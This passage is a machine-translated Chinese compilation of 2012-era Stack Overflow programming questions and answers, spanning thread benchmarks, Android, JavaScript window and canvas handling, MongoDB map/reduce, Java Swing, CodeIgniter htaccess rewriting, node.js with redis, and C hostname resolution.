顺便说一句，Amdhal 定律指出，并行加速的上限是代码串行分数的 1 倍。通常，如果线程之间存在（可能隐藏在运行时中）通信或其他同步，则串行部分会随着处理元素的数量而增加，尽管有时缓存效果会导致超线性加速，有时缓存垃圾会大大降低性能。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-05-01T21:40:55.403

一些实际数字：

我的 i7 上的 CPU 密集型任务（将 1-1000000000 的数字添加到 int var 中，16 次），平均超过 8 次测试：

摘要，线程/滴答声：

```
1/26414
4/8923
8/6659
12/6592
16/6719
64/6811
128/6778 
```

请注意，在下面报告中的“使用 X 线程”行中，X 比可用于执行任务的线程数大一 - 一个线程提交任务并等待倒计时锁存器 evnet 完成 - 它不处理CPU 繁重的任务并且不使用 CPU。

```
8 tests,
16 tasks,
counting to 1000000000,
using 2 threads:
Ticks: 26286
Ticks: 26380
Ticks: 26317
Ticks: 26474
Ticks: 26442
Ticks: 26426
Ticks: 26474
Ticks: 26520
Average: 26414 ms

8 tests,
16 tasks,
counting to 1000000000,
using 5 threads:
Ticks: 8799
Ticks: 9157
Ticks: 8829
Ticks: 9002
Ticks: 9173
Ticks: 8720
Ticks: 8830
Ticks: 8876
Average: 8923 ms

8 tests,
16 tasks,
counting to 1000000000,
using 9 threads:
Ticks: 6615
Ticks: 6583
Ticks: 6630
Ticks: 6599
Ticks: 6521
Ticks: 6895
Ticks: 6848
Ticks: 6583
Average: 6659 ms

8 tests,
16 tasks,
counting to 1000000000,
using 13 threads:
Ticks: 6661
Ticks: 6599
Ticks: 6552
Ticks: 6630
Ticks: 6583
Ticks: 6583
Ticks: 6568
Ticks: 6567
Average: 6592 ms

8 tests,
16 tasks,
counting to 1000000000,
using 17 threads:
Ticks: 6739
Ticks: 6864
Ticks: 6599
Ticks: 6693
Ticks: 6676
Ticks: 6864
Ticks: 6646
Ticks: 6677
Average: 6719 ms

8 tests,
16 tasks,
counting to 1000000000,
using 65 threads:
Ticks: 7223
Ticks: 6552
Ticks: 6879
Ticks: 6677
Ticks: 6833
Ticks: 6786
Ticks: 6739
Ticks: 6802
Average: 6811 ms

8 tests,
16 tasks,
counting to 1000000000,
using 129 threads:
Ticks: 6771
Ticks: 6677
Ticks: 6755
Ticks: 6692
Ticks: 6864
Ticks: 6817
Ticks: 6849
Ticks: 6801
Average: 6778 ms 
```**

# android - 从远程视图获取信息？

> ID：10403202
> 
> 赞同：4
> 
> 时间：2012-05-01T19:35:55.790
> 
> 标签：android, remoteview

我一直在试图弄清楚如何从 remoteView 获取信息。似乎有很多 set 函数，但没有 get 函数。

更准确地说，我 想像[这个问题](https://stackoverflow.com/questions/3779173/determining-the-size-of-an-android-view-at-runtime)一样获得我的远程视图的大小，但对于 remoteViews。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-01T20:08:22.777

这是不可能的，对不起。`RemoteViews`是一种数据结构，旨在传递给另一个进程并由另一个进程使用。

> 更准确地说，我想像这个问题一样获得我的远程视图的大小，但对于 remoteViews。

`RemoteViews`没有“大小”，至少在像素方面，没有 a 更多`String`。由应用 的其他进程创建的结果小部件树`RemoteViews`具有大小，但只有其他进程知道这一点。

# javascript - 在firefox和opera中打开一个带有javascript错误的窗口

> ID：10403203
> 
> 赞同：2
> 
> 时间：2012-05-01T19:35:56.263
> 
> 标签：javascript, firefox, window.open

我想用javascript在后台打开一个文件。该代码在 chrome 中运行良好，但在 Firefox (12) 和 Opera 新窗口中在前台打开。

有人知道我在做什么错吗？

这是它的两个文件的代码：

父亲.html：

```
<html>
<body>
<script>
    var son=null;
    function openIt(){
        son=window.open('son.html','sonpage'); 
        son.blur(); 
        self.focus(); 
        window.focus(); 
        //alert("voy");
        return false;
    }
</script>
<a href="javascript:void(0)" onClick="openIt(); return false;">Open</a>
<a href="javascript:void(0)" onClick="son.close()">Close</a>
<button type="button" id="play2-video" onclick="son.play()">
    play2 video
</button>
<button type="button" id="pause2-video" onclick="son.pausa()">
    pause video
</button>   
Father Page
</body> 
```

儿子.html：

```
<html>
<Head>
    <script>
        function play(){
            alert("Play!");
        }           
        function stop(){
            alert("Stop!");
        }
    </script>
</Head>
<Body>
    <h1> Son Page</h1>
</Body> 
```

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-01T20:07:40.550

> 如果设置了安全选项，Firefox 只会服从引发窗口的请求，并且默认情况下未设置。据我所知，Chrome 根本不会关注 focus() 请求。Safari 确实服从 focus() 请求。
> 
> 特定的 Firefox 设置位于“工具 -> 选项”对话框中。有一个“内容”选项卡，其中有一个用于启用 Javascript 的复选框。随之而来的是一个“高级”按钮，它会打开另一个对话框，其中可以找到一个复选框以允许（或禁止）通过页面代码提升和降低窗口。

阅读[https://stackoverflow.com/a/2533335/643500](https://stackoverflow.com/a/2533335/643500)

试图弄乱代码——不高兴

该功能只需要：

```
function openIt(){
    son=window.open('son.html','sonpage'); 
    window.focus();
    return false;
} 
```

尝试从打开的页面重定向回主页面，看看是否可以通过这种方式完成？

此外，查看 JQuery，它可能会处理类似[http://api.jquery.com/focusout/之类的事件](http://api.jquery.com/focusout/)

# mongodb - Mongodb Map/Reduce - 多个分组依据

> ID：10403204
> 
> 赞同：1
> 
> 时间：2012-05-01T19:35:59.257
> 
> 标签：mongodb, mapreduce, mongodb-query

我正在尝试运行一个`map/reduce`函数，在该函数中`mongodb`，我按集合中对象中包含的 3 个不同字段进行分组。我可以运行 map/reduce 函数，但是所有发出的字段在输出集合中一起运行。我不确定这是否正常，但输出数据进行分析需要更多的工作来清理。有没有办法将它们分开，然后使用`mongoexport`？

让我告诉你我的意思：

我尝试分组的字段是日期、用户 ID（或 uid）和目的地。

我运行这些功能：

```
map = function() {
    day = (this.created_at.getFullYear() + "-" + (this.created_at.getMonth()+1) + "-" + this.created_at.getDate());
    emit({day: day, uid: this.uid, destination: this.destination}, {count:1});
}

/* Reduce Function */
reduce = function(key, values) { 
    var count = 0;
    values.forEach(function(v) {
        count += v['count'];
}
);
  return {count: count};
}

/* Output Function */
db.events.mapReduce(map, reduce, {query: {destination: {$ne:null}}, out: "TMP"}); 
```

输出如下所示：

```
{ "_id" : { "day" : "2012-4-9", "uid" : "1234456", "destination" : "Home" }, "value" : { "count" : 1 } }
{ "_id" : { "day" : "2012-4-9", "uid" : "2345678", "destination" : "Home" }, "value" : { "count" : 1 } }
{ "_id" : { "day" : "2012-4-9", "uid" : "3456789", "destination" : "Login" }, "value" : { "count" : 1 } }
{ "_id" : { "day" : "2012-4-9", "uid" : "4567890", "destination" : "Contact" }, "value" : { "count" : 1 } }
{ "_id" : { "day" : "2012-4-9", "uid" : "5678901", "destination" : "Help" }, "value" : { "count" : 1 } } 
```

当我尝试使用`mongoexport`时，我无法按列分隔日期、uid 或目的地，因为地图将这些字段组合在一起。

我想要的看起来像这样：

```
{ { "day" : "2012-4-9" }, { "uid" : "1234456" }, { "destination" : "Home"}, { "count" : 1 } } 
```

这甚至可能吗？

顺便说一句 - 我能够通过应用`sed`到文件并清理 CSV 来使输出工作。更多的工作，但它奏效了。`mongodb`如果我能以正确的格式 把它弄出来，那将是理想的。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-05T12:02:51.277

MapReduce 只返回表单的文档`{_id:some_id, value:some_value}`

请参阅：[如何更改 MongoDB 的 map-reduce 结果的结构？](https://stackoverflow.com/questions/8416262/how-to-change-the-structure-of-mongodbs-map-reduce-results)

# python - 在 Ubuntu 中打开文件时出现 wxPython 错误

> ID：10403205
> 
> 赞同：1
> 
> 时间：2012-05-01T19:36:00.377
> 
> 标签：python, user-interface, wxpython, ubuntu-11.10

我正在编写[本教程](http://wiki.wxpython.org/Getting%20Started#Windows_or_Frames.3F)，我注意到此代码段存在问题：

```
def OnOpen(self, e):
    """To open d' files"""
    self.dirname = ""
    dlg = wx.FileDialog(self, "Choose a file", self.dirname, "", "*.*", wx.OPEN)
    if dlg.ShowModal() == wx.ID_OK:
        self.filename = dlg.GetFilename()
        self.dirname = dlg.GetDirectory()
        f = open(os.path.join(self.dirname, self.filename))
        self.control.SetValue(f.read())
        f.close()
    dlg.Destroy() 
```

我在 Ubuntu 11.10 中运行代码，只要您不尝试从搜索或最近打开的文件功能中选择文件，它就会按预期工作。显然在这些情况下它没有收到目录，因为 self.dirname 是 None。我想知道 GetFilename 中发生了什么，以及选择搜索或最近使用的文件时 Linux 如何在对话框中返回文件目录。

对此的任何见解将不胜感激。此外，如果有任何地方可以找到特定代码，我们将不胜感激。我知道它在我的驱动器上，但我不知道它在什么文件中。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-01T19:54:10.173

[GetPath](http://wxpython.org/docs/api/wx.FileDialog-class.html#GetPath)不是您想要用来获取所选文件的路径和文件名的函数吗？

# asp.net-mvc - 来自两个不同数据集的项目总和

> ID：10403207
> 
> 赞同：0
> 
> 时间：2012-05-01T19:36:09.430
> 
> 标签：asp.net-mvc, expression, reportviewer

我有两张桌子，每张桌子都有一个总计框。我想得到两个总数的总和并将答案放在一个文本框中。这就是我在报告页面中寻找的内容：

```
=SUM((Fields!TotalHours.Value, "ActivitySummary")+(Fields!TotalHours.Value, "SchoolActivity")) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-02T13:50:55.613

在尝试了多种方法后，这终于奏效了：

```
Sum(Fields!TotalHours.Value, "ActivitySummary") + Sum(Fields!TotalHours.Value, "SchoolActivity") 
```

# c - MPI 计数为零通常是有效的

> ID：10403211
> 
> 赞同：8
> 
> 时间：2012-05-01T19:36:28.160
> 
> 标签：c, fortran, mpi

我今天遇到了[这个](http://www.mcs.anl.gov/research/projects/mpi/www/www3/MPI_Send.html)

> MPI_ERR_COUNT 无效的计数参数。计数参数必须是非负数；零计数通常是有效的。

**零计数通常**有效是什么意思？这是否意味着它依赖于实现？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-05-01T19:45:27.857

我觉得你读得太多了。我认为这只是意味着根据*用户*实现，从 0 开始的任何随机正整数都是有效计数。不难想象一个不需要参数的消息标签。

如果消息标签不需要参数，那么只发送零是有效的（实际上，发送更多可能是无效的）。您必须记住，没有参数与没有数据不同，因为消息标签本身就是一个“参数”。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-05-04T14:24:27.647

这意味着 MPI 中任何需要指定消息数据大小的函数都接受零，但这并不意味着它会导致正确的应用程序代码。

例如，`MPI_Send`接受 0 作为计数，并且将始终发送一个空消息，该消息不携带任何数据但仍有一个信封，并且可以被任何匹配的 接收`MPI_Recv`。另一方面，如果您指定 0 作为计数，`MPI_Recv`您将收到任何已到达的匹配非空消息的消息截断错误。也就是说，0 几乎从来都不是一个有效的（从应用程序的角度来看）计数值，`MPI_Recv`尽管它对于 MPI 来说是完全可以接受的。

零在 MPI 中被广泛接受，因为这样可以编写更对称的代码（例如，没有大量`if (count != 0) ...`

# javascript - HTML5 画布鼠标坐标

> ID：10403214
> 
> 赞同：1
> 
> 时间：2012-05-01T19:36:50.427
> 
> 标签：javascript, html, canvas, onclick, mouseevent

我有一个带有`<canvas>`元素的 HTML 文件，我正在尝试获取`click`事件中的鼠标坐标。我正在使用这段代码：

```
secondCanvas.addEventListener('click', function(e) {
    console.log(e.pageX)
}, false); 
```

当我单击左上角时，我进入控制台 500~ 数字，而不是零......我需要做什么才能获得画布上鼠标的坐标？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-01T20:00:00.000

您应该通过从事件偏移量（`e.pageX`和`e.pageY`）中减去画布元素偏移量来计算画布鼠标位置。
这是一个解释如何在 dom 中获取元素位置的[链接，代码应如下所示：](https://stackoverflow.com/questions/442404/dynamically-retrieve-html-element-x-y-position-with-javascript)

```
secondCanvas.addEventListener('click', function(e) {
   var pos = {
       x : e.pageX - canvasOffsetX,
       y : e.pageY - canvasOffsetY
   };
   console.log(pos.x)
}, false); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-01T19:54:28.113

这是因为您正在获取页面坐标。我猜你想要你的两个画布之一中的当前鼠标位置？希望这能解决您的问题：

[http://www.html5canvastutorials.com/advanced/html5-canvas-mouse-coordinates/](http://www.html5canvastutorials.com/advanced/html5-canvas-mouse-coordinates/)

此外，此 stackoverflow 与您的相似，可能会让您更好地理解： [Tracking mouse position in canvas when no around element exists](https://stackoverflow.com/questions/5085689/tracking-mouse-position-in-canvas)

# 用户解决方案：lwburk

```
function findPos(obj) {
    var curleft = 0, curtop = 0;
    if (obj.offsetParent) {
        do {
            curleft += obj.offsetLeft;
            curtop += obj.offsetTop;
        } while (obj = obj.offsetParent);
        return { x: curleft, y: curtop };
    }
    return undefined;
}

$('#canvas').mousemove(function(e) {
    var pos = findPos(this);
    var x = e.pageX - pos.x;
    var y = e.pageY - pos.y;
    var coordinateDisplay = "x=" + x + ", y=" + y;
    writeCoordinateDisplay(coordinateDisplay);
}); 
```

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2017-09-23T09:19:35.723

我使用此代码，它对我来说非常有效。添加后，画布鼠标事件具有两个新属性：正确映射的 canvasX 和 canvasY。在你获得 canvas 元素后，不要忘记调用 canvas.extendMouseEvents() 并且你在做生意。

```
HTMLCanvasElement.prototype.extendMouseEvents = function() {
    this.mapMouseEvent = function(ev) {
        var r = this.getBoundingClientRect();
        ev.canvasX = ev.pageX - r.left;
        ev.canvasY = ev.pageY - r.top;
    };
    this.addEventListener("mousemove", this.mapMouseEvent);
    this.addEventListener("click", this.mapMouseEvent);
    this.addEventListener("contextmenu", this.mapMouseEvent);
    this.addEventListener("dblclick", this.mapMouseEvent);
    this.addEventListener("mousedown", this.mapMouseEvent);
    this.addEventListener("mouseenter", this.mapMouseEvent);
    this.addEventListener("mouseleave", this.mapMouseEvent);
    this.addEventListener("mouseover", this.mapMouseEvent);
    this.addEventListener("mouseout", this.mapMouseEvent);
    this.addEventListener("mouseup", this.mapMouseEvent);
} 
```

# java - Java for 循环未正确完成

> ID：10403219
> 
> 赞同：-1
> 
> 时间：2012-05-01T19:37:16.027
> 
> 标签：java, loops, for-loop

好的，所以我正在尝试将 64 个 JButtons 的数组添加到具有 8 x 8 网格布局（棋盘类型的东西）的 JFrame。这是相关的代码部分：

```
public class othello implements ActionListener{
int [][] board = new int[8][8];
JFrame window = new JFrame();
JButton[] buttons = new JButton[64];

public othello(){

window.setSize(400,400);
window.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
window.setLayout(new GridLayout(8,8));
window.setVisible(true);
    for (int i=0;i<64;i++){
        buttons[i] = new JButton("");
        buttons[i].addActionListener(this);
        window.add(buttons[i]);
    }
    for (int i=0;i<8;i++){
        for (int j=0;j<8;j++){
            board[i][j]=2;
        }
    }
    board[3][3]=0;board[4][4]=0;
    board[3][4]=1;board[4][3]=1;
}

public void actionPerformed(ActionEvent e){
    for (int i=0;i<8;i++){
        for (int j=0;j<8;j++){
            if(e.getSource()==buttons[i]){
                buttons[i].setEnabled(false);
                board[i][j]=1;
                check();
            }
        }
    }
}

public static void main (String[] args){
    new othello();
} 
```

}

这段代码的结果是实际上添加了看似随机数量的按钮。有时它会添加所有 64 个，更常见的是它可能会添加一半左右，它总是正确启动但在任意点停止（我通过让按钮标签计数来测试）。

我添加了一些 println 来查看循环本身是否真正完成，那里没有问题，它会循环 64 次，它只是在某个时候停止添加按钮。

我是 Java 的初学者，所以我确信这非常简单和愚蠢，但我目前不知道出了什么问题。任何人都可以帮忙吗？

编辑更多代码。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-01T19:43:22.677

你初始化数组了吗？喜欢

```
JButton[] buttons = new JButtons[x]; 
```

进行一些打印以检查循环停止的次数。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-01T19:52:00.743

您应该添加到 ContentPane 而不是直接添加到`JFrame.add()`

> 与所有其他 JFC/Swing 顶级容器一样，JFrame 包含一个 JRootPane 作为其唯一的子项。根窗格提供的内容窗格通常应包含 JFrame 显示的所有非菜单组件。

您是否将布局管理器设置为默认值以外的其他内容？

> 默认内容窗格将设置一个 BorderLayout 管理器。有关添加、删除和设置 JFrame 的 LayoutManager 的详细信息，请参阅 RootPaneContainer。

添加内容的正确惯用代码如下：

```
window.getContentPane().add(child); 
```

有关正确使用的详细信息，请参阅[Javadoc](http://docs.oracle.com/javase/6/docs/api/javax/swing/JFrame.html)。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-01T19:48:40.963

也许您没有使用[事件调度线程](http://docs.oracle.com/javase/tutorial/uiswing/concurrency/dispatch.html)来操作 UI？

来自[Swing 教程](http://docs.oracle.com/javase/tutorial/uiswing/concurrency/)：

> 事件调度线程，所有事件处理代码都在其中执行。大多数与 Swing 框架交互的代码也必须在这个线程上执行。

尝试使用`SwingUtilities.invokeAndWait()`.

编辑：更正的源代码将是：

```
import java.awt.GridLayout;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;

import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.SwingUtilities;

public class othello implements ActionListener
{
    int[][] board = new int[8][8];
    JFrame window = new JFrame();
    JButton[] buttons = new JButton[64];

    public othello()
    {
        try
        {
            SwingUtilities.invokeAndWait(new Runnable()
            {
                public void run()
                {
                    window.setSize(400, 400);
                    window.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
                    window.setLayout(new GridLayout(8, 8));
                    window.setVisible(true);
                    for (int i = 0; i < 64; i++)
                    {
                        buttons[i] = new JButton("");
                        buttons[i].addActionListener(othello.this);
                        window.getContentPane().add(buttons[i]);
                    }
                    for (int i = 0; i < 8; i++)
                    {
                        for (int j = 0; j < 8; j++)
                        {
                            board[i][j] = 2;
                        }
                    }
                    board[3][3] = 0;
                    board[4][4] = 0;
                    board[3][4] = 1;
                    board[4][3] = 1;
                }
            });
        }
        catch (Exception e)
        {
            // TODO Handle exception
            e.printStackTrace();
        }
    }

    public void actionPerformed(ActionEvent e)
    {
        for (int i = 0; i < 8; i++)
        {
            for (int j = 0; j < 8; j++)
            {
                if (e.getSource() == buttons[i])
                {
                    buttons[i].setEnabled(false);
                    board[i][j] = 1;
                    // check();
                }
            }
        }
    }

    public static void main(String[] args)
    {
        new othello();
    }

} 
```

# css - 打印时 CSS 元素在 Chrome 中不起作用

> ID：10403221
> 
> 赞同：2
> 
> 时间：2012-05-01T19:37:34.047
> 
> 标签：css, google-chrome, printing

以下 CSS 在打印时适用于除 Chrome 之外的所有浏览器：

```
.example {
  position: absolute;
  right: 0px;
  bottom: 0px;
  text-align: right
} 
```

我对浏览器中显示的内容不感兴趣，只对打印的内容感兴趣。

这是一个错误吗？有解决方法吗？

**编辑：这似乎是 Chrome 的内置 PDF 插件的问题。**

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-01T19:51:42.977

您的 css 包含在 html 中，例如：

```
<link rel="stylesheet" type="text/css" href="theme.css" media="screen" /> 
```

要么删除 media="screen"，要么添加另一个用于打印：

```
<link rel="stylesheet" type="text/css" href="print.css" media="print"/> 
```

[http://www.w3schools.com/tags/att_link_media.asp](http://www.w3schools.com/tags/att_link_media.asp)

# php - Codeigniter htaccess - 子文件夹中的控制器不起作用

> ID：10403233
> 
> 赞同：2
> 
> 时间：2012-05-01T19:37:57.380
> 
> 标签：php, .htaccess, codeigniter, mod-rewrite, controller

我是 CI 新手，对重写规则知之甚少。我能够从 stackoverflow 帖子中找到 htaccess 规则，它允许我从 URL 中删除 index.php。ht访问规则如下

```
<IfModule mod_rewrite.c>
 RewriteEngine On
 RewriteBase /siebeluigen/

 #Removes access to the system folder by users.
 #Additionally this will allow you to create a System.php controller,
 #previously this would not have been possible.
 #'system' can be replaced if you have renamed your system folder.
 RewriteCond %{REQUEST_URI} ^system.*
 RewriteRule ^(.*)$ /index.php?/$1 [L]

 #When your application folder isn't in the system folder
 #This snippet prevents user access to the application folder
 #Submitted by: Fabdrol
 #Rename 'application' to your applications folder name.
 RewriteCond %{REQUEST_URI} ^application.* 
 RewriteRule ^(.*)$ /index.php?/$1 [L]

 #Checks to see if the user is attempting to access a valid file,
 #such as an image or css document, if this isn't true it sends the
 #request to index.php
 RewriteCond %{REQUEST_FILENAME} !-f
 RewriteCond %{REQUEST_FILENAME} !-d
 RewriteRule ^(.*)$ index.php?/$1 [L]
</IfModule>

<IfModule !mod_rewrite.c>
 # If we don't have mod_rewrite installed, all 404's
 # can be sent to index.php, and everything works as normal.
 # Submitted by: ElliotHaughin

 ErrorDocument 404 /index.php
</IfModule> 
```

但是，如果我将控制器直接移动到控制器内的子文件夹，这将不起作用。例如

如果我将我的应用程序控制器放在以下路径中

```
application/controllers/application.php 
```

然后我可以从 URL 访问它

```
http://localhost/siebeluigen/application 
```

但是如果我的目录结构是

```
application/controllers/app/application.php 
```

然后我收到以下网址错误

```
http://localhost/siebeluigen/app/application 
```

但它是这样工作的

```
http://localhost/siebeluigen/index.php/app/application 
```

所以，我很确定 htaccess 中有一些东西我应该能够改变以使其工作。

请帮忙！！！

**更新**

我的 htaccess 文件位于应用程序文件夹而不是根目录中。将文件移动到 index.php 所在的文件夹解决了这个问题。我已经标记了有效的答案。谢谢...

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-03T05:34:33.600

这是我在所有项目中使用的 htaccess 文件：

```
Options -Indexes
Options +FollowSymLinks

# Set the default file for indexes
DirectoryIndex index.php

<IfModule mod_rewrite.c>

    # activate URL rewriting
    RewriteEngine on

    # do not rewrite links to the documentation, assets and public files
    RewriteCond $1 !^(images|assets|uploads|captcha)

    # do not rewrite for php files in the document root, robots.txt or the maintenance page
    RewriteCond $1 !^([^\..]+\.php|robots\.txt)

    # but rewrite everything else
    RewriteRule ^(.*)$ index.php/$1 [L]
</IfModule>

<IfModule !mod_rewrite.c>

    # If we don't have mod_rewrite installed, all 404's
    # can be sent to index.php, and everything works as normal.

    ErrorDocument 404 index.php

</IfModule> 
```

然后 - 还要确保在您的 config.php 文件中

```
 $config['index_page'] = ''; 
```

编辑：您永远不想将某人指向您的应用程序文件夹-您总是将他们指向您的 index.php-一切都通过 Index.php-它会重新路由到需要的位置。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-01T19:53:16.437

这是通常意味着重定向到 application.php 的条件

```
RewriteCond %{REQUEST_URI} ^application.* 
```

应用程序/应用程序不符合此条件。尝试将其更改为：

```
RewriteCond %{REQUEST_URI} ^app/application.* 
```

# jquery - 不能使用回调函数和缓动插件

> ID：10403235
> 
> 赞同：0
> 
> 时间：2012-05-01T19:38:02.273
> 
> 标签：jquery, callback

我无法让以下工作，完全打破页面......如果我拿出回调函数它会工作......不知道我做错了什么......

```
$(document).ready(function() {

var easing = 'easeOutBounce';

$('#cont').click(function() {
    $('#cont').animate({width: '400px'}, {duration:1000, easing: easing, complete:function(){ $(this).html("Animation Completed");});
            $('#conttwo').animate({width: '100px'}, {duration:1000, easing: easing});
            $('#contthree').animate({width: '100px'}, {duration:1000, easing: easing});
}); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-01T19:49:25.567

默认情况下，jQuery 只支持`swing`和缓`linear`动。如果你想使用更高级的缓动函数，你需要从[jQuery UI](http://jqueryui.com/)中包含它们。

作为更新，我应该注意到 jQuery UI 似乎没有提供 easeOutBounce。您需要找到一个合适的插件来提供它。快速搜索表明您可以使用[jQuery Easing Plugin](http://gsgd.co.uk/sandbox/jquery/easing/)来完成。

# node.js - 异步查找子字符串匹配。递归？压扁？

> ID：10403236
> 
> 赞同：3
> 
> 时间：2012-05-01T19:38:04.203
> 
> 标签：node.js, redis

我真的很想用redis来喜欢node.js，但是我无法克服异步性。我再次拥有传统数据库和语言中的简单任务。我的问题更多是关于在异步数据库获取中完成控制流和逻辑，而不是我的问题解决方法是否最佳。

这就是我想要做的：我有由单词组成的redis键，让我们说`car`and `card`。现在，给定一个输入字符串，我想知道最长的子字符串是什么，它与 redis 中的键匹配。我只需要检查从给定字符串的位置 0 开始的子字符串，所以复杂度很低。

示例：`cardinal`其中有键`card`，还有`car`, 但`card`更长。`Cape`不匹配任何一个键。

我的方法是：从整个字符串开始，检查它是否匹配一个键。如果是，则返回该密钥。否则，对字符串减去最后一个字符重复相同的过程。

我怎样才能完成这项任务？欢迎不同的方法。

我对图书馆了解一点`async`，它看起来`waterfall`最适合我正在做的事情。但是，我似乎需要从 string.length、string.length-1 等输入所有函数，直到最后一个字符。我正在寻找的是一个带中断的 for 循环的良好替代品。

下面我用一个我假设总是 3 个字符或更多字符的输入进行测试（因为它已经很丑陋了，而且更多的嵌套似乎对测试毫无意义）。它有效，`carde`导致`card`, 和`care`-> `car`。废话给`no match`。

```
var http = require("http");
var redis = require("redis");

http.createServer(function(request, response) {
    client = redis.createClient();
    word = "carde";
    client.keys(word, function(err, reply) {
        if(err) { response.end(err); client.end(); }
        else {
          if(reply.length > 0) {
            response.end(word);
            client.end();
          }
          else {
            client.keys(word.slice(0,-1), function(err, reply) {
                if(err) { response.end(err); client.end(); }
                else {
                  if(reply.length > 0) {
                    response.end(word.slice(0, -1));
                    client.end();
                  }
                  else {
                    client.keys(word.slice(0, -2), function(err,reply) {
                        if(err) { response.end(err); client.end(); }
                        else {
                          if(reply.length > 0) {
                            response.end(word.slice(0, -2));
                            client.end();
                          }
                          else {
                            response.end("no match");
                          }
                        }
                      });
                  }
                }
              });
          }
        }
    });
  }).listen(8000); 
```

我也尝试过递归，它可能是最好的方法。（感谢 Timonthy Strimple 纠正错误）。

```
http.createServer(function(request, response) {
    client = redis.createClient();
    recursiveKeys("cardinalsin", client, response);
  }).listen(8000);

function recursiveKeys(word, client, response) {
  if (word.length == 0) {
    response.write("0");
    response.end();
    client.end();
  }
  else {
    client.keys(word, function(err, reply) {
        if(err) {
          response.write("0");
          response.end();
          client.end();
        }
        else {
          if(reply.length > 0) {
            response.write(word);
            response.end();
            client.end();
          }
          else {
            return recursiveKeys(word.slice(0,-1), client, response);
          }
        }
      });
  }
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-02T03:24:52.333

我同意递归解决方案可能是最好的。我在研究您的代码之前解决了这个问题（以免影响实验）并得出了一个非常相似的解决方案。搜索一个单词`http://localhost:3000/?word=cardinal`

```
var http  = require('http');
var redis = require('redis');
var url   = require('url');

var findWord = function(needle, client, callback) {
  if (needle.length <= 0) { return callback("Word not found") }

  client.keys(needle, function(err, reply) {
    if (err) { callback("Word not found"); }
    else {
      if (reply.length > 0) {
        callback(needle);
      } else {
        findWord(needle.slice(0, -1), client, callback);
      }
    }
  });
};

var server = http.createServer(function(request, response) {
  var query  = url.parse(request.url, true).query;
  var word   = query.word || "";
  var client = redis.createClient();

  findWord(word, client, function(found) {
    client.end();
    response.writeHead(200, {"Content-Type": "text/plain"});
    response.end(found);
  });
});
server.listen(3000); 
```

# c - Unix - 如何获取域名的 IP 地址？

> ID：10403238
> 
> 赞同：0
> 
> 时间：2012-05-01T19:38:18.530
> 
> 标签：c, unix, localhost, hosts-file

在 UNIX 的 C 程序中，gethostbyname() 可用于获取域的地址，如“localhost”。如何将结果从 gethostbyname() 转换为点分十进制表示法。

```
struct hostent* pHostInfo;
long nHostAddress;

/* get IP address from name */
pHostInfo=gethostbyname("localhost");

if(!pHostInfo){
    printf("Could not resolve host name\n");
    return 0;
}

/* copy address into long */
memset(&nHostAddress, 0, sizeof(nHostAddress));
memcpy(&nHostAddress,pHostInfo->h_addr,pHostInfo->h_length); 
```

nHostAddress 包含以下内容：

```
16777243 
```

如何转换结果，以便我可以得到输出：

```
127.0.0.1 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2015-06-02T09:23:12.047

编译这段代码很简单

```
#include<stdio.h>
#include<netdb.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
int main()
{
    struct hostent *ghbn=gethostbyname("www.kamonesium.in");//change the domain name
    if (ghbn) {
        printf("Host Name->%s\n", ghbn->h_name);
        printf("IP ADDRESS->%s\n",inet_ntoa(*(struct in_addr *)ghbn->h_name) );
    }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-01T19:42:47.600

您可以`struct in_addr`使用以下命令从 a 直接转换为字符串`inet_ntoa()`：

```
char *address = inet_ntoa(pHostInfo->h_addr); 
```

但是，您得到的值 (16777243) 看起来是错误的 - 结果是 1.0.0.27！

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-01T19:45:46.143

该`inet_ntoa()`API 可以满足您的需求，但显然已被弃用：

[https://beej.us/guide/bgnet/html/multi/inet_ntoaman.html](https://beej.us/guide/bgnet/html/multi/inet_ntoaman.html)

如果你想要一些更面向未来的 IPV6ish，有`inet_ntop()`：

[https://beej.us/guide/bgnet/html/multi/inet_ntopman.html](https://beej.us/guide/bgnet/html/multi/inet_ntopman.html)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2019-01-19T15:32:10.367

最后一条语句中的变量“ **h_name** ”需要修改为“ **h_addr** ”，如下所示：

printf("IP 地址->%s\n",inet_ntoa(*(struct in_addr *)ghbn->h_addr) );

# .net - 在哪里可以找到 Microsoft Build 引擎 Redistributables

> ID：10403239
> 
> 赞同：0
> 
> 时间：2012-05-01T19:38:20.063
> 
> 标签：.net, msbuild, c#-3.0

我想在我的一个项目中使用构建引擎 api。我知道这些都预装了visual studio。我想知道是否真的需要完整安装 Visual Studio 才能使用这些 api，或者我可以为其重新分发？我正在寻找一种方法是否可以避免安装 Visual Studio？

任何帮助将不胜感激。谢谢， 奥姆基

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-01T19:43:41.337

这包含在 .NET 中，因此您只需重新分发适当版本的 .NET（完整配置文件 - 客户端配置文件不包括 MSBuild）。

# google-chrome-extension - Chrome 内容脚本未加载 JS

> ID：10403240
> 
